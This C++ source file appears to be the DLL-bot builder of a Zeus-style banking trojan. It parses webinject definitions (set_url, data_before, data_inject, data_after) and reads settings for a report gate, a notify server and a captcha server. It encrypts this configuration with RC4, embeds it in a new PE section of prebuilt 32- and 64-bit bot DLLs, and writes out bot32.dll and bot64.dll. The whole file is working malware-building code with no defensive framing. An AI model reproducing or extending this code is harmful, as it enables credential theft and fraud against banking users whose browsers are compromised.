#include <windows.h>
#include <shlwapi.h>

#include "defines.h"
#include "builddll.h"
#include "tools.h"
#include "languages.h"
#include "dllfile32.h"
#include "dllfile64.h"
#include "activation.h"

#include "..\common\mem.h"
#include "..\common\str.h"
#include "..\common\crypt.h"
#include "..\common\binstorage.h"
#include "..\common\httpinject.h"
#include "..\common\advconfigstructs.h"

#include "..\common\peimage.h"
#include "..\common\fs.h"
#include "..\common\gui.h"

#include "..\common\config.h"

#define COPYITEM(name, index, tg)if(name > 0){Mem::_copy(cur, pcfgvar->pValues[index], ++name); tmp = name; name = cur - data; cur += tmp; tg.size += tmp;}
#define COPYITEM_WI(name, index)if(name > 0){Mem::_copy(pMCur, args[index], ++name); wTmp = name; name = pMCur - (LPBYTE)pd->wi; pMCur += wTmp; cwi.size += wTmp;}

#define ARG_QUTE_NONE   0
#define ARG_QUTE_NORMAL '\''
#define ARG_QUTE_DOUBLE '\"'

bool __GetArgA(LPSTR pStart, LPSTR pEnd, LPSTR *s, LPSTR *e)
{
	BYTE k = false;
	while(pStart < pEnd && (*pStart == ' ' || *pStart == '\t'))
		pStart++;
	if(pStart >= pEnd)
		return false;
	if(*pStart == ARG_QUTE_DOUBLE || *pStart == ARG_QUTE_NORMAL)
	{
		k = *pStart; 
		pStart++;
	}
	*s = pStart;
	while(pStart < pEnd)
	{
		if(k != ARG_QUTE_NONE)
		{
			if(*pStart == k)
			{
				*e = pStart - 1;
				return true;
			}
		}

		else if(*pStart == ' ' || *pStart == '\t' || *pStart == ARG_QUTE_DOUBLE || *pStart == ARG_QUTE_NORMAL)
		{
			*e = pStart - 1;
			return true;
		}
		pStart++;
	}
	if(k)
		return false;
	*e = pStart - 1;
	return true;
}

DWORD __GetArgsA(LPSTR pStart, LPSTR pEnd, LPSTR **ppArgs, LPSTR *ppNewEnd, DWORD dwLimit)
{
	if(pStart == NULL || pStart >= pEnd)
		return 0;
	DWORD dwArgsCount = 0;
	LPSTR _s, _e = pStart;
	*ppArgs = NULL;

	while(pStart < pEnd && dwArgsCount < dwLimit && __GetArgA(pStart, pEnd, &_s, &_e) && (_s = Str::_CopyExA(_s, _e -_s + 1)))
	{
		if(!(*ppArgs = (LPSTR *)Mem::realloc(*ppArgs, sizeof(LPSTR *) * (dwArgsCount + 1))))
			break;
		(*ppArgs)[dwArgsCount++] = _s;
		pStart = _e + (_e[1] == '\"' ? 2 : 1);
	}
	if(ppNewEnd)
		*ppNewEnd = pStart >= pEnd ? NULL : pStart;
	return dwArgsCount;
}

#define WI_DATA_URL         "set_url"
#define WI_DATA_URL_SIZE    (sizeof(WI_DATA_URL) - 1)
#define WI_DATA_BEFORE      "data_before\r\n"
#define WI_DATA_BEFORE_SIZE (sizeof(WI_DATA_BEFORE) - 3)
#define WI_DATA_INJECT      "data_inject\r\n"
#define WI_DATA_INJECT_SIZE (sizeof(WI_DATA_INJECT) - 3)
#define WI_DATA_AFTER       "data_after\r\n"
#define WI_DATA_AFTER_SIZE  (sizeof(WI_DATA_AFTER) - 3)
#define WI_DATA_END         "data_end\r\n"
#define WI_DATA_END_SIZE    (sizeof(WI_DATA_END) - 3)

typedef struct
{
	LPBYTE                  next;
	HttpInject::HEADER     *wi;
	DWORD                   blockCount;
	HttpInject::INJECTBLOCK **beforeBlock;
	HttpInject::INJECTBLOCK **newBlock;
	HttpInject::INJECTBLOCK **afterBlock;
}SNIDATA;

static bool searchNextInject_Tool_is_filled_inject(SNIDATA *pd)
{
	DWORD index = pd->blockCount - 1;
	return (pd->beforeBlock[index] && pd->newBlock[index] && pd->afterBlock[index]);
}

static bool searchNextInject_Tool_alloc_for_next(SNIDATA *pd)
{
	pd->blockCount++;
	if(!Mem::reallocEx(&pd->beforeBlock, pd->blockCount * sizeof(HttpInject::INJECTBLOCK *))) return false;
	if(!Mem::reallocEx(&pd->newBlock,    pd->blockCount * sizeof(HttpInject::INJECTBLOCK *))) return false;
	if(!Mem::reallocEx(&pd->afterBlock,  pd->blockCount * sizeof(HttpInject::INJECTBLOCK *))) return false;
	return true;
}

static void freeWebInject(SNIDATA *pd)
{
	Mem::free(pd->wi);
	Mem::freeArrayOfPointers(pd->beforeBlock, pd->blockCount);
	Mem::freeArrayOfPointers(pd->newBlock,    pd->blockCount);
	Mem::freeArrayOfPointers(pd->afterBlock,  pd->blockCount);
}

static bool searchNextWebInject(LPBYTE data, LPBYTE end, SNIDATA *pd, DWORD flags)
{
	Mem::_zero(pd, sizeof(SNIDATA));

	BYTE step = 0;
	HttpInject::INJECTBLOCK **pudCur;
	LPBYTE pDataStart;
	bool ok = true;

	while(data < end)
	{
		while((*data == ' ' || *data == '\t') && data < end)
			data++;
		if(data == end)
			break;

		LPBYTE strEnd  = data;
		while(*strEnd != '\n' && strEnd < end)
			strEnd++;

		DWORD size = strEnd - data - (strEnd < end ? 1 : 0);
		if(size && *data != ';')
		{
			if(step == 0)
			{
				LPSTR *args = NULL;
				DWORD argCount = 0;
				ok = false;
				if((argCount = __GetArgsA((LPSTR)data, (LPSTR)strEnd - (*(strEnd - 1) == '\r' ? 1 : 0), &args, NULL, 8)) > 0)
				{
					if(argCount < 3 || CWA(kernel32, lstrcmpiA)(WI_DATA_URL, args[0]) != 0)
					{
						Mem::freeArrayOfPointers(args, argCount);
						break;
					}

					HttpInject::HEADER cwi;
					Mem::_zero(&cwi, sizeof(HttpInject::HEADER));

					WORD wTmp = Str::_LengthA(args[2]);
					for(WORD i = 0; i < wTmp; i++)
					{
						switch(args[2][i])
						{
							case 'P': cwi.flags |= HttpInject::FLAG_REQUEST_POST; break;
							case 'G': cwi.flags |= HttpInject::FLAG_REQUEST_GET; break;
							case 'L': cwi.flags |= HttpInject::FLAG_IS_CAPTURE; break;
							case 'F': cwi.flags |= HttpInject::FLAG_CAPTURE_TOFILE; break;
							case 'H': cwi.flags |= HttpInject::FLAG_CAPTURE_NOTPARSE; break;
							case 'D': cwi.flags |= HttpInject::FLAG_ONCE_PER_DAY; break;
							case 'I': cwi.flags |= HttpInject::FLAG_URL_CASE_INSENSITIVE; break;
							case 'C': cwi.flags |= HttpInject::FLAG_CONTEXT_CASE_INSENSITIVE; break;
						}
					}
					if((cwi.flags & HttpInject::FLAG_IS_CAPTURE) == 0)
						cwi.flags |= HttpInject::FLAG_IS_INJECT;

					cwi.urlMask           = Str::_LengthA(args[1]);
					cwi.postDataBlackMask = (argCount > 3 && !(args[3][0] == '*' && args[3][1] == 0)) ? Str::_LengthA(args[3]) : 0;
					cwi.postDataWhiteMask = (argCount > 4 && !(args[4][0] == '*' && args[4][1] == 0)) ? Str::_LengthA(args[4]) : 0;
					cwi.contextMask       = argCount > 5 ? Str::_LengthA(args[5]) : 0;

					pd->wi = (HttpInject::HEADER *)Mem::alloc(10 + sizeof(HttpInject::HEADER) + cwi.urlMask + cwi.postDataBlackMask + cwi.postDataWhiteMask + cwi.contextMask);
					if(pd->wi == NULL)
					{
						Mem::freeArrayOfPointers(args, argCount);
						break;
					}
					LPBYTE pMCur = (LPBYTE)pd->wi + sizeof(HttpInject::HEADER);

					COPYITEM_WI(cwi.urlMask,           1);
					COPYITEM_WI(cwi.postDataBlackMask, 3);
					COPYITEM_WI(cwi.postDataWhiteMask, 4);
					COPYITEM_WI(cwi.contextMask,       5);

					cwi.size += sizeof(HttpInject::HEADER);
					Mem::_copy(pd->wi, &cwi, sizeof(HttpInject::HEADER));
					Mem::freeArrayOfPointers(args, argCount);

					if(!searchNextInject_Tool_alloc_for_next(pd))
						break;
					step = 1;
				}
				else 
					break;
			}
			else if(step == 1)
			{
				if(size > WI_DATA_URL_SIZE && CWA(shlwapi, StrCmpNIA)(WI_DATA_URL, (LPSTR)data, WI_DATA_URL_SIZE) == 0 && (data[WI_DATA_URL_SIZE] == ' ' || data[WI_DATA_URL_SIZE] == '\t'))
				{
					pd->next = data;
					break;
				}

				ok = false;
				if(size == WI_DATA_BEFORE_SIZE && CWA(shlwapi, StrCmpNIA)(WI_DATA_BEFORE, (LPSTR)data, WI_DATA_BEFORE_SIZE) == 0)
				{
					pudCur = &((pd->beforeBlock)[pd->blockCount - 1]);
				}
				else if(size == WI_DATA_INJECT_SIZE && CWA(shlwapi, StrCmpNIA)(WI_DATA_INJECT, (LPSTR)data, WI_DATA_INJECT_SIZE) == 0)
				{
					pudCur = &((pd->newBlock)[pd->blockCount - 1]);
				}
				else if(size == WI_DATA_AFTER_SIZE && CWA(shlwapi, StrCmpNIA)(WI_DATA_AFTER, (LPSTR)data, WI_DATA_AFTER_SIZE) == 0)
				{
					pudCur = &((pd->afterBlock)[pd->blockCount - 1]);
				}
				else 
					break;

				pDataStart = strEnd + 1;
				step = 2;
			}
			else if(step == 2)
			{
				if(size == WI_DATA_END_SIZE && CWA(shlwapi, StrCmpNIA)(WI_DATA_END, (LPSTR)data, size) == 0)
				{
					DWORD csize = 0;
					if(data > pDataStart)
					{
						csize = data - pDataStart - 1;
						if(*(data - 2) == '\r')
							csize--;
					}
					if(csize + sizeof(HttpInject::INJECTBLOCK) >= 0xFFFF || 
						(*pudCur = (HttpInject::INJECTBLOCK *)Mem::alloc(csize + sizeof(HttpInject::INJECTBLOCK))) == NULL)
						break;

					(*pudCur)->flags = 0;
					(*pudCur)->size = (WORD)(csize + sizeof(HttpInject::INJECTBLOCK));
					Mem::_copy((LPBYTE)(*pudCur) + sizeof(HttpInject::INJECTBLOCK), pDataStart, csize);

					if(searchNextInject_Tool_is_filled_inject(pd))
					{
						if(!searchNextInject_Tool_alloc_for_next(pd))
							break;
						ok = true;
					}
					step = 1;
				}
			}
		}

		data = strEnd + 1;
	}

	if(!ok)
		freeWebInject(pd);
	else if(pd->blockCount > 0)
		pd->blockCount--;

	return ok;
}

static DWORD buildWebInject(HWND output, LPWSTR file, BinStorage::STORAGE **ph, LPBYTE *injectsList, LPDWORD injectsSize, LPDWORD injectsCount)
{
	DWORD totalCount = 0;

	Fs::MEMFILE mf;
	if(!Fs::_fileToMem(file, &mf, 0))
		return Languages::builder_httpinjects_fopen_failed;

	DWORD errorMsg = (DWORD)-1; 

	if(mf.size > 0)
	{
		LPBYTE end = (LPBYTE)mf.data + mf.size;
		SNIDATA sd;
		sd.next = (LPBYTE)mf.data;

		bool ok = false;

		while((ok = searchNextWebInject(sd.next, end, &sd, 0)) && sd.blockCount > 0)
		{
			if(!Mem::reallocEx(injectsList, *injectsSize + sd.wi->size))
				ok = false;
			else
			{
				ok = true;
				Mem::_copy(*injectsList + *injectsSize, sd.wi, sd.wi->size);
				*injectsSize += sd.wi->size;

				DWORD dwCurSize = 0;
				LPBYTE pInjectList = NULL;

				for(DWORD i = 0; i < sd.blockCount; i++)
				{
					if(!Mem::reallocEx(&pInjectList, dwCurSize + sd.beforeBlock[i]->size + sd.newBlock[i]->size + sd.afterBlock[i]->size))
					{
						ok = false;
						break;
					}

					Mem::_copy(pInjectList + dwCurSize, sd.beforeBlock[i], sd.beforeBlock[i]->size); dwCurSize += sd.beforeBlock[i]->size;
					Mem::_copy(pInjectList + dwCurSize, sd.afterBlock[i],  sd.afterBlock[i]->size);  dwCurSize += sd.afterBlock[i]->size;
					Mem::_copy(pInjectList + dwCurSize, sd.newBlock[i],    sd.newBlock[i]->size);    dwCurSize += sd.newBlock[i]->size;
				}

				if(ok)
				{
					writeOutput(output, L"%u=%S", totalCount, (LPBYTE)sd.wi + sd.wi->urlMask);
					ok = BinStorage::_addItem(ph, *injectsCount + (++totalCount), BinStorage::ITEMF_COMBINE_OVERWRITE | BinStorage::ITEMF_IS_HTTP_INJECT | BinStorage::ITEMF_COMPRESSED, pInjectList, dwCurSize);
					if(!ok)
						errorMsg = Languages::error_not_enough_memory;
				}
				Mem::free(pInjectList);
			}

			freeWebInject(&sd);

			if(!ok || sd.next == NULL)break;
		}

		if(!ok && errorMsg == (DWORD)-1)
			errorMsg = Languages::builder_httpinjects_bad_format;
	}

	Fs::_closeMemFile(&mf);

	*injectsCount += totalCount;
	return errorMsg;
}

static HttpInject::CAPTCHAENTRY *captcha2Binary(Config0::VAR *pcfgvar)
{
	if(pcfgvar->bValuesCount < 2)
		return NULL;

	WORD tmp;
	HttpInject::CAPTCHAENTRY ce;
	ce.size = 0;


	ce.urlHostMask = Str::_LengthA(pcfgvar->pValues[0]);
	ce.urlCaptcha  = Str::_LengthA(pcfgvar->pValues[1]);

	LPBYTE data = (LPBYTE)Mem::alloc(10 + sizeof(HttpInject::CAPTCHAENTRY) + ce.urlHostMask + ce.urlCaptcha);
	if(data == NULL)
		return NULL;
	LPBYTE cur = data + sizeof(HttpInject::CAPTCHAENTRY);

	COPYITEM(ce.urlHostMask, 0, ce);
	COPYITEM(ce.urlCaptcha,  1, ce);

	ce.size += sizeof(HttpInject::CAPTCHAENTRY);
	Mem::_copy(data, &ce, sizeof(HttpInject::CAPTCHAENTRY));

	return (HttpInject::CAPTCHAENTRY *)data;
}

static bool childToMultiString(HWND output, BinStorage::STORAGE **ph, Config0::VAR *parent, LPSTR entryName, DWORD cfgID, BYTE valuesCount)
{
	Config0::VAR *pcvc;
	if((pcvc = Config0::_GetVar(parent, NULL, NULL, entryName)) && pcvc->dwChildsCount > 0)
	{
		DWORD count = 0;
		DWORD size = 0;
		LPSTR list = NULL;
		bool error = false;
		DWORD strSize;

		for(DWORD i = 0; i < pcvc->dwChildsCount; i++)
		{
			if(pcvc->pChilds[i].bValuesCount == valuesCount)
			{
				for(BYTE k = 0; k < valuesCount; k++)
				{
					if((strSize = Str::_LengthA(pcvc->pChilds[i].pValues[k])) == 0)
					{
						Mem::free(list);
						return false;
					}

					Str::UTF8STRING u8s;
					if(!Str::_utf8FromAnsi(pcvc->pChilds[i].pValues[k], strSize, &u8s))
					{
						error = true;
						break;
					}

					if(!Mem::reallocEx(&list, size + u8s.size + 2))
					{
						Str::_utf8Free(&u8s);
						error = true;
						break;
					}

					Mem::_copy(list + size, u8s.data, u8s.size + 1);
					size += u8s.size + 1;
					Str::_utf8Free(&u8s);
				}
				writeOutput(output, L"%S[%u]=%S", entryName, count++, pcvc->pChilds[i].pValues[0]);
			}
			else
			{
				Mem::free(list);
				return false;
			}
		}

		if(count > 0 && !error)
		{
			list[++size] = 0;
			error = !BinStorage::_addItem(ph, cfgID, BinStorage::ITEMF_COMBINE_OVERWRITE | BinStorage::ITEMF_IS_OPTION | BinStorage::ITEMF_COMPRESSED, list, size);
		}
		Mem::free(list);
		if(error)return false;
	}
	return true;
}

void BuildDll::init(void)
{

}

void BuildDll::uninit(void)
{

}

bool BuildDll::_run(HWND owner, HWND output, Config0::CFGDATA *config, LPWSTR destFolder)
{
	Config0::VAR *rootNode;
	Config0::VAR *currentNode;

	Crypt::RC4KEY rc4Key;
	DWORD keySize; 

	writeOutput(output, Languages::get(Languages::builder_bot_proc_creating));
	
	BinStorage::STORAGE *ph = BinStorage::_createEmpty();
	if(ph == NULL)
	{
		writeOutputError(output, Languages::get(Languages::error_not_enough_memory));
		return false;		
	}

	//Open configuration
	if((rootNode = Config0::_GetVar(NULL, config, NULL, "DllConfig")) == NULL)
	{
		writeOutputError(output, Languages::get(Languages::builder_dllconfig_not_founded));
		Mem::free(ph);
		return false;
	}

	//Encryption key
	{
		if((currentNode = Config0::_GetVar(rootNode, NULL, "encryption_key", NULL)) == NULL || currentNode->bValuesCount < 2 || (keySize = Str::_LengthA(currentNode->pValues[1])) < 1)
		{
			writeOutputError(output, Languages::get(Languages::builder_dllconfig_encryptionkey_error));
			Mem::free(ph);
			return false;
		}
		Crypt::_rc4Init(currentNode->pValues[1], keySize, &rc4Key);
		writeOutput(output, L"encryption_key=OK");
	}

	//gate for reports
	currentNode = Config0::_GetVar(rootNode, NULL, "url_server", NULL);
	if(currentNode && currentNode->bValuesCount >= 2)
	{
		if(!BinStorage::_addItemAsUtf8StringA(&ph, CFGID_URL_SERVER_0, BinStorage::ITEMF_COMBINE_OVERWRITE | BinStorage::ITEMF_IS_OPTION, currentNode->pValues[1]))
		{
			writeOutputError(output, Languages::get(Languages::builder_dllconfig_urlserver_error));
			Mem::free(ph);
			return false;
		}
		writeOutput(output, L"url_server=%S", currentNode->pValues[1]);
	}
	
	
	//Notify server
	currentNode = Config0::_GetVar(rootNode, NULL, "notify_server", NULL);
	if(currentNode && currentNode->bValuesCount >= 2)
	{
		if(!BinStorage::_addItemAsUtf8StringA(&ph, CFGID_NOTIFY_SERVER, BinStorage::ITEMF_COMBINE_OVERWRITE | BinStorage::ITEMF_IS_OPTION, currentNode->pValues[1]))
		{
			writeOutputError(output, Languages::get(Languages::builder_dllconfig_notifyserver_error));
			Mem::free(ph);
			return false;
		}
		writeOutput(output, L"notify_server=%S", currentNode->pValues[1]);
	}

	//WebFilters aka notify list
	if(!childToMultiString(output, &ph, rootNode, "webfilters", CFGID_HTTP_FILTER, 1))
	{
		writeOutputError(output, Languages::get(Languages::builder_dllconfig_webfilters_error));
		Mem::free(ph);
		return false;
	}

	DWORD captchasSize  = 0;
	LPBYTE captchasList = NULL;

	//Captchas
	currentNode = Config0::_GetVar(rootNode, NULL, "captcha_server", NULL);
	if(currentNode && currentNode->bValuesCount >= 2)
	{
		if(!BinStorage::_addItemAsUtf8StringA(&ph, CFGID_CAPTCHA_SERVER, BinStorage::ITEMF_COMBINE_OVERWRITE | BinStorage::ITEMF_IS_OPTION, currentNode->pValues[1]))
		{
			writeOutputError(output, Languages::get(Languages::builder_dllconfig_captchas_error));
			Mem::free(ph);
			return false;
		}
		writeOutput(output, L"captcha_server=%S", currentNode->pValues[1]);

		if((currentNode = Config0::_GetVar(rootNode, NULL, NULL, "CaptchaList")) && currentNode->dwChildsCount > 0)
		{
			for(DWORD i = 0; i < currentNode->dwChildsCount; i++)
			{
				HttpInject::CAPTCHAENTRY *pce = captcha2Binary(&currentNode->pChilds[i]);
				if(pce == NULL || !Mem::reallocEx(&captchasList, captchasSize + pce->size))
				{
					Mem::free(pce);
					Mem::free(captchasList);

					writeOutputError(output, Languages::get(Languages::builder_dllconfig_captchas_error));

					Mem::free(ph);
					return false;
				}

				writeOutput(output, L"captcha[%u]=%S %S", i, (LPBYTE)pce + pce->urlHostMask, (LPBYTE)pce + pce->urlCaptcha);
				Mem::_copy(captchasList + captchasSize, pce, pce->size);
				captchasSize += pce->size;
				Mem::free(pce);
			}
		}
		else
		{
			writeOutputError(output, Languages::get(Languages::builder_dllconfig_captchas_error));
			Mem::free(ph);
			return false;
		}
		bool ok = BinStorage::_addItem(&ph, CFGID_CAPTCHA_LIST, BinStorage::ITEMF_COMBINE_OVERWRITE | BinStorage::ITEMF_IS_OPTION | BinStorage::ITEMF_COMPRESSED, captchasList, captchasSize);
		Mem::free(captchasList);
		if(!ok)
		{
			writeOutputError(output, Languages::get(Languages::builder_dllconfig_captchas_error));
			Mem::free(ph);
			return false;
		}
	}

	DWORD injectsCount = 0;
	DWORD injectsSize  = 0;
	LPBYTE injectsList = NULL;

	//file_webinjects
	if((currentNode = Config0::_GetVar(rootNode, NULL, "file_webinjects", NULL)))
	{
		if(currentNode->bValuesCount != 2)
		{
			writeOutputError(output, Languages::get(Languages::builder_dll_file_webinjects_error));
			Mem::free(ph);
			return false;
		}
		writeOutput(output, L"file_webinjects=%S", currentNode->pValues[1]);
		WCHAR file[MAX_PATH];
		LPWSTR ptmp = Str::_ansiToUnicodeEx(currentNode->pValues[1], -1);

		if(!ptmp)
		{
			writeOutputError(output, Languages::get(Languages::error_not_enough_memory));
			Mem::free(ph);
			return false;
		}
		Fs::_pathCombine(file, destFolder, ptmp);
		Mem::free(ptmp);

		writeOutput(output, Languages::get(Languages::builder_httpinjects_begin));
		DWORD ee = buildWebInject(output, file, &ph, &injectsList, &injectsSize, &injectsCount);
		if(ee != (DWORD)-1)
		{
			writeOutputError(output, Languages::get(ee));
			Mem::free(ph);
			return false;
		}
	}

	//Пишим инжекты, фейки.
	if(injectsSize > 0)
	{
		bool ok = BinStorage::_addItem(&ph, CFGID_HTTP_INJECTS_LIST, BinStorage::ITEMF_COMBINE_OVERWRITE | BinStorage::ITEMF_IS_OPTION | BinStorage::ITEMF_COMPRESSED, injectsList, injectsSize);
		Mem::free(injectsList);
		if(!ok)
		{
			writeOutputError(output, Languages::get(Languages::builder_dll_file_webinjects_error));
			Mem::free(ph);
			return false;
		}
	}

	//Create new PE32 from binary
	PeImage::PEDATA originalPe32;
	if(PeImage::_createFromMemory(&originalPe32, (LPBYTE)dllfile32, sizeof(dllfile32), false) == NULL)
	{
		writeOutputError(output, Languages::get(Languages::builder_bot_corrupted));
		Mem::free(ph);
		return false;
	}
	//Create new PE32+ from binary
	PeImage::PEDATA originalPe64;
	if(PeImage::_createFromMemory(&originalPe64, (LPBYTE)dllfile64, sizeof(dllfile64), false) == NULL)
	{
		writeOutputError(output, Languages::get(Languages::builder_bot_corrupted));
		Mem::free(ph);
		return false;
	}

	DWORD packSize;
	//Crypt data
	{
		packSize = BinStorage::_pack(&ph, BinStorage::PACKF_FINAL_MODE, &rc4Key);
		
		//no crypt
		//packSize = BinStorage::_pack(&ph, BinStorage::PACKF_FINAL_MODE, NULL);
		if(packSize == NULL)
		{
			Mem::free(ph);
			return false;
		}
	}

	DWORD sectionSize = sizeof(rc4Key.state) + sizeof(packSize) + packSize ;
	LPBYTE sectionData = (LPBYTE)Mem::alloc(sectionSize);
	if (!sectionData)
	{
		writeOutputError(output, Languages::get(Languages::error_not_enough_memory));
		Mem::free(ph);
		return false;
	}

	Mem::_copy(sectionData, &rc4Key.state, sizeof(rc4Key.state));
	for (DWORD i = 0; i < sizeof(rc4Key.state); i += sizeof(DWORD))
		*(DWORD *)&sectionData[i] ^= RAND_DWORD1;
	Mem::_copy(sectionData + sizeof(rc4Key.state), &packSize, sizeof(packSize));
	*(DWORD *)&sectionData[sizeof(rc4Key.state)] ^= RAND_DWORD2;
	Mem::_copy(sectionData + sizeof(rc4Key.state) + sizeof(packSize), ph, packSize);

	PeImage::_addSection(&originalPe32, ".data1", IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_INITIALIZED_DATA, sectionData,
				PeImage::_getCurrentRawSize(&originalPe32), sectionSize, PeImage::_getCurrentVirtualSize(&originalPe32),
				sectionSize, 0);
	
	PeImage::_addSection(&originalPe64, ".data1", IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_INITIALIZED_DATA, sectionData,
				PeImage::_getCurrentRawSize(&originalPe64), sectionSize, PeImage::_getCurrentVirtualSize(&originalPe64),
				sectionSize, 0);
				
	//Building PE32
	LPBYTE destRawPe32    = NULL;
	DWORD destRawPeSize32 = 0;
	{
		if((destRawPeSize32 = PeImage::_buildImage(&originalPe32, 0, 0, &destRawPe32)) == 0)
			destRawPe32 = NULL;

		PeImage::_freeImage(&originalPe32);

		//Узнаем размер образа
		if(destRawPe32 == NULL)
		{
			writeOutputError(output, Languages::get(Languages::error_not_enough_memory));
			Mem::free(ph);
			return false;
		}
		else
		{
			WCHAR info[100];
			Str::_sprintfW(info, sizeof(info) / sizeof(WCHAR), Languages::get(Languages::builder_bot_proc_output_info), destRawPeSize32);
			writeOutput(output, info);
		}

	}
	
	//Building PE32+
	LPBYTE destRawPe64    = NULL;
	DWORD destRawPeSize64 = 0;
	{
		if((destRawPeSize64 = PeImage::_buildImage(&originalPe64, 0, 0, &destRawPe64)) == 0)
			destRawPe64 = NULL;

		PeImage::_freeImage(&originalPe64);

		//Узнаем размер образа
		if(destRawPe64 == NULL)
		{
			writeOutputError(output, Languages::get(Languages::error_not_enough_memory));
			Mem::free(ph);
			return false;
		}
		else
		{
			WCHAR info[100];
			Str::_sprintfW(info, sizeof(info) / sizeof(WCHAR), Languages::get(Languages::builder_bot_proc_output_info), destRawPeSize64);
			writeOutput(output, info);
		}

	}

	//Write file
	{
		WCHAR outputFile[MAX_PATH];
		WCHAR outputFile64[MAX_PATH];
		Fs::_pathCombine(outputFile, destFolder, L"bot32.dll");

		bool rsf = (Gui::_browseForSaveFile(owner, destFolder, outputFile, NULL, NULL, 0) && Fs::_saveToFile(outputFile, destRawPe32, destRawPeSize32));
		Mem::free(destRawPe32);

		DWORD i = Str::_LengthW(outputFile);
		while (outputFile[i] != '\\')
		{
			outputFile[i] = 0x00;
			i--;
		}
		
		Fs::_pathCombine(outputFile64, outputFile, L"bot64.dll");
		
		rsf &= Fs::_saveToFile(outputFile64, destRawPe64, destRawPeSize64);
		if(!rsf)
		{
			writeOutputError(output, Languages::get(Languages::error_fwrite_failed));
			Mem::free(ph);
			return false;
		}
	}

	writeOutput(output, Languages::get(Languages::builder_bot_proc_end));
	Mem::free(ph);
	return true;
}